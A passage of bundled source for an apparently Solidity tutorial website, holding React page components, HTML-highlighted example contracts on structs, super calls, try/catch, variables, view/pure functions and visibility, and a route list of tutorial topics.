update completed</span>\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">toggleCompleted</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">uint</span> _index</span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> </span>{\n        Todo <span class=\"hljs-keyword\">storage</span> todo = todos[_index];\n        todo.completed = !todo.completed;\n    }\n}\n</code></pre>\n<h3 id=\"declaring-and-importing-struct\">Declaring and importing Struct</h3>\n<p>File that the struct is declared in</p>\n<pre><code class=\"language-solidity\"><span class=\"hljs-comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"hljs-meta\"><span class=\"hljs-keyword\">pragma</span> <span class=\"hljs-keyword\">solidity</span> ^0.7.6;</span>\n\n<span class=\"hljs-keyword\">struct</span> <span class=\"hljs-title\">Todo</span> {\n    <span class=\"hljs-keyword\">string</span> text;\n    <span class=\"hljs-keyword\">bool</span> completed;\n}</code></pre>\n<p>File that imports the struct above</p>\n<pre><code class=\"language-solidity\"><span class=\"hljs-comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"hljs-meta\"><span class=\"hljs-keyword\">pragma</span> <span class=\"hljs-keyword\">solidity</span> ^0.7.6;</span>\n\n<span class=\"hljs-keyword\">import</span> <span class=\"hljs-string\">\"./StructDeclaration.sol\"</span>;\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">contract</span> <span class=\"hljs-title\">Todos</span> </span>{\n    <span class=\"hljs-comment\">// An array of &#x27;Todo&#x27; structs</span>\n    Todo[] <span class=\"hljs-keyword\">public</span> todos;\n}</code></pre>\n`\n\nexport default html\n","import React from \"react\"\nimport Example from \"../../components/Example\"\nimport html, { version, title, description } from \"./index.html\"\n\nfunction ExamplePage() {\n  return (\n    <Example\n      version={version}\n      title={title}\n      description={description}\n      html={html}\n    />\n  )\n}\n\nexport default ExamplePage\n","// metadata\nexport const version = \"0.7.6\"\nexport const title = \"Calling Parent Contracts\"\nexport const description = \"An example of calling parent contracts in Solidity\"\n\nconst html = `<p>Parent contracts can be called directly, or by using the keyword <code>super</code>.</p>\n<p>By using the keyword <code>super</code>, all of the immediate parent contracts will be called.</p>\n<pre><code class=\"language-solidity\"><span class=\"hljs-comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"hljs-meta\"><span class=\"hljs-keyword\">pragma</span> <span class=\"hljs-keyword\">solidity</span> ^0.7.6;</span>\n\n<span class=\"hljs-comment\">/* Inheritance tree\n   A\n /  \\\\\nB   C\n \\\\ /\n  D\n*/</span>\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">contract</span> <span class=\"hljs-title\">A</span> </span>{\n    <span class=\"hljs-comment\">// This is called an event. You can emit events from your function</span>\n    <span class=\"hljs-comment\">// and they are logged into the transaction log.</span>\n    <span class=\"hljs-comment\">// In our case, this will be useful for tracing function calls.</span>\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">event</span> <span class=\"hljs-title\">Log</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">string</span> message</span>)</span>;\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">foo</span>(<span class=\"hljs-params\"></span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">virtual</span></span> </span>{\n        <span class=\"hljs-keyword\">emit</span> Log(<span class=\"hljs-string\">\"A.foo called\"</span>);\n    }\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">bar</span>(<span class=\"hljs-params\"></span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">virtual</span></span> </span>{\n        <span class=\"hljs-keyword\">emit</span> Log(<span class=\"hljs-string\">\"A.bar called\"</span>);\n    }\n}\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">contract</span> <span class=\"hljs-title\">B</span> <span class=\"hljs-keyword\">is</span> <span class=\"hljs-title\">A</span> </span>{\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">foo</span>(<span class=\"hljs-params\"></span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">virtual</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">override</span></span> </span>{\n        <span class=\"hljs-keyword\">emit</span> Log(<span class=\"hljs-string\">\"B.foo called\"</span>);\n        A.foo();\n    }\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">bar</span>(<span class=\"hljs-params\"></span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">virtual</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">override</span></span> </span>{\n        <span class=\"hljs-keyword\">emit</span> Log(<span class=\"hljs-string\">\"B.bar called\"</span>);\n        <span class=\"hljs-built_in\">super</span>.bar();\n    }\n}\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">contract</span> <span class=\"hljs-title\">C</span> <span class=\"hljs-keyword\">is</span> <span class=\"hljs-title\">A</span> </span>{\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">foo</span>(<span class=\"hljs-params\"></span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">virtual</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">override</span></span> </span>{\n        <span class=\"hljs-keyword\">emit</span> Log(<span class=\"hljs-string\">\"C.foo called\"</span>);\n        A.foo();\n    }\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">bar</span>(<span class=\"hljs-params\"></span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">virtual</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">override</span></span> </span>{\n        <span class=\"hljs-keyword\">emit</span> Log(<span class=\"hljs-string\">\"C.bar called\"</span>);\n        <span class=\"hljs-built_in\">super</span>.bar();\n    }\n}\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">contract</span> <span class=\"hljs-title\">D</span> <span class=\"hljs-keyword\">is</span> <span class=\"hljs-title\">B</span>, <span class=\"hljs-title\">C</span> </span>{\n    <span class=\"hljs-comment\">// Try:</span>\n    <span class=\"hljs-comment\">// - Call D.foo and check the transaction logs.</span>\n    <span class=\"hljs-comment\">//   Although D inherits A, B and C, it only called C and then A.</span>\n    <span class=\"hljs-comment\">// - Call D.bar and check the transaction logs</span>\n    <span class=\"hljs-comment\">//   D called C, then B, and finally A.</span>\n    <span class=\"hljs-comment\">//   Although super was called twice (by B and C) it only called A once.</span>\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">foo</span>(<span class=\"hljs-params\"></span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">override</span></span>(<span class=\"hljs-params\">B, C</span>) </span>{\n        <span class=\"hljs-built_in\">super</span>.foo();\n    }\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">bar</span>(<span class=\"hljs-params\"></span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">override</span></span>(<span class=\"hljs-params\">B, C</span>) </span>{\n        <span class=\"hljs-built_in\">super</span>.bar();\n    }\n}\n</code></pre>\n`\n\nexport default html\n","import React from \"react\"\nimport Example from \"../../components/Example\"\nimport html, { version, title, description } from \"./index.html\"\n\nfunction ExamplePage() {\n  return (\n    <Example\n      version={version}\n      title={title}\n      description={description}\n      html={html}\n    />\n  )\n}\n\nexport default ExamplePage\n","// metadata\nexport const version = \"0.7.6\"\nexport const title = \"Try Catch\"\nexport const description = \"An example of try / catch in Solidity\"\n\nconst html = `<p><code>try / catch</code> can only catch errors from external function calls and contract creation.</p>\n<pre><code class=\"language-solidity\"><span class=\"hljs-comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"hljs-meta\"><span class=\"hljs-keyword\">pragma</span> <span class=\"hljs-keyword\">solidity</span> ^0.7.6;</span>\n\n<span class=\"hljs-comment\">// External contract used for try / catch examples</span>\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">contract</span> <span class=\"hljs-title\">Foo</span> </span>{\n    <span class=\"hljs-keyword\">address</span> <span class=\"hljs-keyword\">public</span> owner;\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">constructor</span> (<span class=\"hljs-params\"><span class=\"hljs-keyword\">address</span> _owner</span>) </span>{\n        <span class=\"hljs-built_in\">require</span>(_owner != <span class=\"hljs-keyword\">address</span>(<span class=\"hljs-number\">0</span>), <span class=\"hljs-string\">\"invalid address\"</span>);\n        <span class=\"hljs-built_in\">assert</span>(_owner != <span class=\"hljs-number\">0x0000000000000000000000000000000000000001</span>);\n        owner = _owner;\n    }\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">myFunc</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">uint</span> x</span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">pure</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">returns</span></span> (<span class=\"hljs-params\"><span class=\"hljs-keyword\">string</span> <span class=\"hljs-keyword\">memory</span></span>) </span>{\n        <span class=\"hljs-built_in\">require</span>(x != <span class=\"hljs-number\">0</span>, <span class=\"hljs-string\">\"require failed\"</span>);\n        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-string\">\"my func was called\"</span>;\n    }\n}\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">contract</span> <span class=\"hljs-title\">Bar</span> </span>{\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">event</span> <span class=\"hljs-title\">Log</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">string</span> message</span>)</span>;\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">event</span> <span class=\"hljs-title\">LogBytes</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">bytes</span> data</span>)</span>;\n\n    Foo <span class=\"hljs-keyword\">public</span> foo;\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">constructor</span>(<span class=\"hljs-params\"></span>) </span>{\n        <span class=\"hljs-comment\">// This Foo contract is used for example of try catch with external call</span>\n        foo = <span class=\"hljs-keyword\">new</span> Foo(<span class=\"hljs-built_in\">msg</span>.<span class=\"hljs-built_in\">sender</span>);\n    }\n\n    <span class=\"hljs-comment\">// Example of try / catch with external call</span>\n    <span class=\"hljs-comment\">// tryCatchExternalCall(0) =&gt; Log(\"external call failed\")</span>\n    <span class=\"hljs-comment\">// tryCatchExternalCall(1) =&gt; Log(\"my func was called\")</span>\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">tryCatchExternalCall</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">uint</span> _i</span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> </span>{\n        <span class=\"hljs-keyword\">try</span> foo.myFunc(_i) <span class=\"hljs-keyword\">returns</span> (<span class=\"hljs-keyword\">string</span> <span class=\"hljs-keyword\">memory</span> result) {\n            <span class=\"hljs-keyword\">emit</span> Log(result);\n        } <span class=\"hljs-keyword\">catch</span> {\n            <span class=\"hljs-keyword\">emit</span> Log(<span class=\"hljs-string\">\"external call failed\"</span>);\n        }\n    }\n\n    <span class=\"hljs-comment\">// Example of try / catch with contract creation</span>\n    <span class=\"hljs-comment\">// tryCatchNewContract(0x0000000000000000000000000000000000000000) =&gt; Log(\"invalid address\")</span>\n    <span class=\"hljs-comment\">// tryCatchNewContract(0x0000000000000000000000000000000000000001) =&gt; LogBytes(\"\")</span>\n    <span class=\"hljs-comment\">// tryCatchNewContract(0x0000000000000000000000000000000000000002) =&gt; Log(\"Foo created\")</span>\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">tryCatchNewContract</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">address</span> _owner</span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> </span>{\n        <span class=\"hljs-keyword\">try</span> <span class=\"hljs-keyword\">new</span> Foo(_owner) <span class=\"hljs-keyword\">returns</span> (Foo foo) {\n            <span class=\"hljs-comment\">// you can use variable foo here</span>\n            <span class=\"hljs-keyword\">emit</span> Log(<span class=\"hljs-string\">\"Foo created\"</span>);\n        } <span class=\"hljs-keyword\">catch</span> <span class=\"hljs-built_in\">Error</span>(<span class=\"hljs-keyword\">string</span> <span class=\"hljs-keyword\">memory</span> reason) {\n            <span class=\"hljs-comment\">// catch failing revert() and require()</span>\n            <span class=\"hljs-keyword\">emit</span> Log(reason);\n        } <span class=\"hljs-keyword\">catch</span> (<span class=\"hljs-keyword\">bytes</span> <span class=\"hljs-keyword\">memory</span> reason) {\n            <span class=\"hljs-comment\">// catch failing assert()</span>\n            <span class=\"hljs-keyword\">emit</span> LogBytes(reason);\n        }\n    }\n}</code></pre>\n`\n\nexport default html\n","import React from \"react\"\nimport Example from \"../../components/Example\"\nimport html, { version, title, description } from \"./index.html\"\n\nfunction ExamplePage() {\n  return (\n    <Example\n      version={version}\n      title={title}\n      description={description}\n      html={html}\n    />\n  )\n}\n\nexport default ExamplePage\n","// metadata\nexport const version = \"0.7.6\"\nexport const title = \"Variables\"\nexport const description = \"Local, state and global variables\"\n\nconst html = `<p>There are 3 types of variables in Solidity</p>\n<ul>\n<li><strong>local</strong><ul>\n<li>declared inside a function</li>\n<li>not stored on the blockchain</li>\n</ul>\n</li>\n<li><strong>state</strong><ul>\n<li>declared outside a function</li>\n<li>stored on the blockchain</li>\n</ul>\n</li>\n<li><strong>global</strong> (provides information about the blockchain)</li>\n</ul>\n<pre><code class=\"language-solidity\"><span class=\"hljs-comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"hljs-meta\"><span class=\"hljs-keyword\">pragma</span> <span class=\"hljs-keyword\">solidity</span> ^0.7.6;</span>\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">contract</span> <span class=\"hljs-title\">Variables</span> </span>{\n    <span class=\"hljs-comment\">// State variables are stored on the blockchain.</span>\n    <span class=\"hljs-keyword\">string</span> <span class=\"hljs-keyword\">public</span> text = <span class=\"hljs-string\">\"Hello\"</span>;\n    <span class=\"hljs-keyword\">uint</span> <span class=\"hljs-keyword\">public</span> num = <span class=\"hljs-number\">123</span>;\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">doSomething</span>(<span class=\"hljs-params\"></span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> </span>{\n        <span class=\"hljs-comment\">// Local variables are not saved to the blockchain.</span>\n        <span class=\"hljs-keyword\">uint</span> i = <span class=\"hljs-number\">456</span>;\n\n        <span class=\"hljs-comment\">// Here are some global variables</span>\n        <span class=\"hljs-keyword\">uint</span> timestamp = <span class=\"hljs-built_in\">block</span>.<span class=\"hljs-built_in\">timestamp</span>; <span class=\"hljs-comment\">// Current block timestamp</span>\n        <span class=\"hljs-keyword\">address</span> sender = <span class=\"hljs-built_in\">msg</span>.<span class=\"hljs-built_in\">sender</span>; <span class=\"hljs-comment\">// address of the caller</span>\n    }\n}\n</code></pre>\n`\n\nexport default html\n","import React from \"react\"\nimport Example from \"../../components/Example\"\nimport html, { version, title, description } from \"./index.html\"\n\nfunction ExamplePage() {\n  return (\n    <Example\n      version={version}\n      title={title}\n      description={description}\n      html={html}\n    />\n  )\n}\n\nexport default ExamplePage\n","// metadata\nexport const version = \"0.7.6\"\nexport const title = \"View and Pure Functions\"\nexport const description = \"An example of view and pure functions in Solidity\"\n\nconst html = `<p>Getter functions can be declared <code>view</code> or <code>pure</code>.</p>\n<p><code>View</code> function declares that no state will be changed.</p>\n<p><code>Pure</code> function declares that no state variable will be changed or read.</p>\n<pre><code class=\"language-solidity\"><span class=\"hljs-comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"hljs-meta\"><span class=\"hljs-keyword\">pragma</span> <span class=\"hljs-keyword\">solidity</span> ^0.7.6;</span>\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">contract</span> <span class=\"hljs-title\">ViewAndPure</span> </span>{\n    <span class=\"hljs-keyword\">uint</span> <span class=\"hljs-keyword\">public</span> x = <span class=\"hljs-number\">1</span>;\n\n    <span class=\"hljs-comment\">// Promise not to modify the state.</span>\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">addToX</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">uint</span> y</span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">view</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">returns</span></span> (<span class=\"hljs-params\"><span class=\"hljs-keyword\">uint</span></span>) </span>{\n        <span class=\"hljs-keyword\">return</span> x + y;\n    }\n\n    <span class=\"hljs-comment\">// Promise not to modify or read from the state.</span>\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">add</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">uint</span> i, <span class=\"hljs-keyword\">uint</span> j</span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">pure</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">returns</span></span> (<span class=\"hljs-params\"><span class=\"hljs-keyword\">uint</span></span>) </span>{\n        <span class=\"hljs-keyword\">return</span> i + j;\n    }\n}\n</code></pre>\n`\n\nexport default html\n","import React from \"react\"\nimport Example from \"../../components/Example\"\nimport html, { version, title, description } from \"./index.html\"\n\nfunction ExamplePage() {\n  return (\n    <Example\n      version={version}\n      title={title}\n      description={description}\n      html={html}\n    />\n  )\n}\n\nexport default ExamplePage\n","// metadata\nexport const version = \"0.7.6\"\nexport const title = \"Visibility\"\nexport const description = \"An example of external, internal, private and public functions in Solidity\"\n\nconst html = `<p>Functions and state variables have to declare whether they are accessible by other contracts.</p>\n<p>Fucntions can be declared as</p>\n<ul>\n<li><code>public</code> - any contract and account can call</li>\n<li><code>private</code> - only inside the contract that defines the function</li>\n<li><code>internal</code>- only inside contract that inherits an <code>internal</code> function</li>\n<li><code>external</code> - only other contracts and accounts can call</li>\n</ul>\n<p>State variables can be declared as <code>public</code>, <code>private</code>, or <code>internal</code> but not <code>external</code>.</p>\n<pre><code class=\"language-solidity\"><span class=\"hljs-comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"hljs-meta\"><span class=\"hljs-keyword\">pragma</span> <span class=\"hljs-keyword\">solidity</span> ^0.7.6;</span>\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">contract</span> <span class=\"hljs-title\">Base</span> </span>{\n    <span class=\"hljs-comment\">// Private function can only be called</span>\n    <span class=\"hljs-comment\">// - inside this contract</span>\n    <span class=\"hljs-comment\">// Contracts that inherit this contract cannot call this function.</span>\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">privateFunc</span>(<span class=\"hljs-params\"></span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">private</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">pure</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">returns</span></span> (<span class=\"hljs-params\"><span class=\"hljs-keyword\">string</span> <span class=\"hljs-keyword\">memory</span></span>) </span>{\n        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-string\">\"private function called\"</span>;\n    }\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">testPrivateFunc</span>(<span class=\"hljs-params\"></span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">pure</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">returns</span></span> (<span class=\"hljs-params\"><span class=\"hljs-keyword\">string</span> <span class=\"hljs-keyword\">memory</span></span>) </span>{\n        <span class=\"hljs-keyword\">return</span> privateFunc();\n    }\n\n    <span class=\"hljs-comment\">// Internal function can be called</span>\n    <span class=\"hljs-comment\">// - inside this contract</span>\n    <span class=\"hljs-comment\">// - inside contracts that inherit this contract</span>\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">internalFunc</span>(<span class=\"hljs-params\"></span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">internal</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">pure</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">returns</span></span> (<span class=\"hljs-params\"><span class=\"hljs-keyword\">string</span> <span class=\"hljs-keyword\">memory</span></span>) </span>{\n        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-string\">\"internal function called\"</span>;\n    }\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">testInternalFunc</span>(<span class=\"hljs-params\"></span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">pure</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">virtual</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">returns</span></span> (<span class=\"hljs-params\"><span class=\"hljs-keyword\">string</span> <span class=\"hljs-keyword\">memory</span></span>) </span>{\n        <span class=\"hljs-keyword\">return</span> internalFunc();\n    }\n\n    <span class=\"hljs-comment\">// Public functions can be called</span>\n    <span class=\"hljs-comment\">// - inside this contract</span>\n    <span class=\"hljs-comment\">// - inside contracts that inherit this contract</span>\n    <span class=\"hljs-comment\">// - by other contracts and accounts</span>\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">publicFunc</span>(<span class=\"hljs-params\"></span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">pure</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">returns</span></span> (<span class=\"hljs-params\"><span class=\"hljs-keyword\">string</span> <span class=\"hljs-keyword\">memory</span></span>) </span>{\n        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-string\">\"public function called\"</span>;\n    }\n\n    <span class=\"hljs-comment\">// External functions can only be called</span>\n    <span class=\"hljs-comment\">// - by other contracts and accounts</span>\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">externalFunc</span>(<span class=\"hljs-params\"></span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">external</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">pure</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">returns</span></span> (<span class=\"hljs-params\"><span class=\"hljs-keyword\">string</span> <span class=\"hljs-keyword\">memory</span></span>) </span>{\n        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-string\">\"external function called\"</span>;\n    }\n\n    <span class=\"hljs-comment\">// This function will not compile since we&#x27;re trying to call</span>\n    <span class=\"hljs-comment\">// an external function here.</span>\n    <span class=\"hljs-comment\">// function testExternalFunc() public pure returns (string memory) {</span>\n    <span class=\"hljs-comment\">//     return externalFunc();</span>\n    <span class=\"hljs-comment\">// }</span>\n\n    <span class=\"hljs-comment\">// State variables</span>\n    <span class=\"hljs-keyword\">string</span> <span class=\"hljs-keyword\">private</span> privateVar = <span class=\"hljs-string\">\"my private variable\"</span>;\n    <span class=\"hljs-keyword\">string</span> <span class=\"hljs-keyword\">internal</span> internalVar = <span class=\"hljs-string\">\"my internal variable\"</span>;\n    <span class=\"hljs-keyword\">string</span> <span class=\"hljs-keyword\">public</span> publicVar = <span class=\"hljs-string\">\"my public variable\"</span>;\n    <span class=\"hljs-comment\">// State variables cannot be external so this code won&#x27;t compile.</span>\n    <span class=\"hljs-comment\">// string external externalVar = \"my external variable\";</span>\n}\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">contract</span> <span class=\"hljs-title\">Child</span> <span class=\"hljs-keyword\">is</span> <span class=\"hljs-title\">Base</span> </span>{\n    <span class=\"hljs-comment\">// Inherited contracts do not have access to private functions</span>\n    <span class=\"hljs-comment\">// and state variables.</span>\n    <span class=\"hljs-comment\">// function testPrivateFunc() public pure returns (string memory) {</span>\n    <span class=\"hljs-comment\">//     return privateFunc();</span>\n    <span class=\"hljs-comment\">// }</span>\n\n    <span class=\"hljs-comment\">// Internal function call be called inside child contracts.</span>\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">testInternalFunc</span>(<span class=\"hljs-params\"></span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">pure</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">override</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">returns</span></span> (<span class=\"hljs-params\"><span class=\"hljs-keyword\">string</span> <span class=\"hljs-keyword\">memory</span></span>) </span>{\n        <span class=\"hljs-keyword\">return</span> internalFunc();\n    }\n}\n</code></pre>\n`\n\nexport default html\n","import React from \"react\"\nimport styles from \"./Label.module.css\"\n\ninterface Props {\n  type: \"breakingChanges\" | \"newFeature\"\n}\n\nconst Label: React.FC<Props> = ({ type }) => {\n  switch (type) {\n    case \"breakingChanges\": {\n      const color = \"#fbbc04\"\n\n      return (\n        <span className={styles.component} style={{ backgroundColor: color }}>\n          Breaking changes\n        </span>\n      )\n    }\n    case \"newFeature\": {\n      const color = \"#ccff90\"\n\n      return (\n        <span className={styles.component} style={{ backgroundColor: color }}>\n          New\n        </span>\n      )\n    }\n    default:\n      throw new Error(`invalid label type ${type}`)\n  }\n}\n\nexport default Label\n","import React from \"react\"\nimport SEO from \"../components/SEO\"\nimport Label from \"../components/Label\"\nimport styles from \"./index.module.css\"\n\ninterface Route {\n  path: string\n  title: string\n  breakingChanges?: boolean\n  newFeature?: boolean\n}\n\nconst SOL_ROUTES: Route[] = [\n  {\n    path: \"hello-world\",\n    title: \"Hello World\",\n  },\n  {\n    path: \"first-app\",\n    title: \"First App\",\n  },\n  {\n    path: \"primitives\",\n    title: \"Primitive Data Types\",\n  },\n  {\n    path: \"variables\",\n    title: \"Variables\",\n  },\n  {\n    path: \"state-variables\",\n    title: \"Reading and Writing to a State Variable\",\n  },\n  {\n    path: \"ether-units\",\n    title: \"Ether and Wei\",\n  },\n  {\n    path: \"gas\",\n    title: \"Gas and Gas Price\",\n  },\n  // Flow control\n  {\n    path: \"if-else\",\n    title: \"If / Else\",\n  },\n  {\n    path: \"loop\",\n    title: \"For and While Loop\",\n  },\n  // collection data types\n  {\n    path: \"mapping\",\n    title: \"Mapping\",\n  },\n  {\n    path: \"array\",\n    title: \"Array\",\n  },\n  // custom data types\n  {\n    path: \"enum\",\n    title: \"Enum\",\n  },\n  {\n    path: \"structs\",\n    title: \"Structs\",\n  },\n  {\n    path: \"data-locations\",\n    title: \"Data Locations - Storage, Memory and Calldata\",\n  },\n  // function\n  {\n    path: \"function\",\n    title: \"Function\",\n  },\n  {\n    path: \"view-and-pure-functions\",\n    title: \"View and Pure Functions\",\n  },\n  {\n    path: \"error\",\n    title: \"Error\",\n  },\n  {\n    path: \"function-modifier\",\n    title: \"Function Modifier\",\n  },\n  {\n    path: \"events\",\n    title: \"Events\",\n  },\n  // inheritance\n  {\n    path: \"constructor\",\n    title: \"Constructor\",\n  },\n  {\n    path: \"inheritance\",\n    title: \"Inheritance\",\n  },\n  {\n    path: \"shadowing-inherited-state-variables\",\n    title: \"Shadowing Inherited State Variables\",\n  },\n  {\n    path: \"super\",\n    title: \"Calling Parent Contracts\",\n  },\n  {\n    path: \"visibility\",\n    title: \"Visibility\",\n  },\n  {\n    path: \"interface\",\n    title: \"Interface\",\n  },\n  // send / receive ether\n  {\n    path: \"payable\",\n    title: \"Payable\",\n  },\n  {\n    path: \"sending-ether\",\n    title: \"Sending Ether - Transfer, Send, and Call\",\n  },\n  {\n    path: \"fallback\",\n    title: \"Fallback\",\n  },\n  // contract interaction\n  {\n    path: \"call\",\n    title: \"Call\",\n  },\n  {\n    path: \"delegatecall\",\n    title: \"Delegatecall\",\n  },\n  {\n    path: \"calling-contract\",\n    title: \"Calling Other Contract\",\n  },\n  {\n    path: \"new-contract\",\n    title: \"Creating Contracts from a Contract\",\n  },\n  // misc\n  {\n    path: \"try-catch\",\n    title: \"Try / Catch\",\n  },\n  {\n    path: \"import\",\n    title: \"Import\",\n  },\n  {\n    path: \"library\",\n    title: \"Library\",\n  },\n  // crypto\n  {\n    path: \"hashing\",\n    title: \"Hashing with Keccak256\",\n  },\n  {\n    path: \"signature\",\n    title: \"Verifying Signature\",\n  },\n]\n\nconst APP_ROUTES: Route[] = [\n  {\n    path: \"multi-sig-wallet\",\n    title: \"Multi Sig Wallet\",\n  },\n  {\n    path: \"merkle-tree\",\n    title: \"Merkle Tree\",\n  },\n  {\n    path: \"iterable-mapping\",\n    title: \"Iterable Mapping\",\n  },\n  {\n    path: \"erc20\",\n    title: \"ERC20\",\n  },\n  {\n    path: \"create2\",\n    title: \"Precompute Contract Address with Create2\",\n  },\n  {\n    path: \"minimal-proxy\",\n    title: \"Minimal Proxy Contract\",\n  